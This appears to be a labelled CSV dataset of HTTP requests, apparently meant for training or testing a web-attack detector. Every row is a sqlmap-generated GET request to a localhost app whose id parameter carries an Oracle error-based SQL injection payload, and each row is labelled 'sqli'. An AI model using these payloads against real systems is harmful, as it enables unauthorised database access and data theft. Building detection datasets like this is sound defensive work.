method,url,headers,body,label
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20uknT,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%23%20aXcU,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20AIBf,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%27bXZw%27%3D%27bXZw,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%27niqj%27%3D%27niqj,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%28%27MEft%27%3D%27MEft,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%27qDGj%27%3D%27qDGj,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%27hYFE%27%20LIKE%20%27hYFE,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%27DMeM%27%20LIKE%20%27DMeM,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%25%27%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%27MQEz%25%27%3D%27MQEz,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%27SKyn%27%20LIKE%20%27SKyn,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%22YitN%22%3D%22YitN,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%22pkHt%22%3D%22pkHt,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%22bLyR%22%3D%22bLyR,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%22cuca%22%20LIKE%20%22cuca,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%22qDmR%22%20LIKE%20%22qDmR,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20OR%20%27uksv%27%3D%27JXzm,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20ifvV,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%285438%3D5438,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%286606%3D6606,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%287053%3D7053,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20vpUB,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%23%20TNUp,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20ekyl,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%27PEJD%27%3D%27PEJD,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%27OLlT%27%3D%27OLlT,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%28%27gpkJ%27%3D%27gpkJ,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%27nevz%27%3D%27nevz,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%206622%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286622%3D6622%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%27tNOo%27%20LIKE%20%27tNOo,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
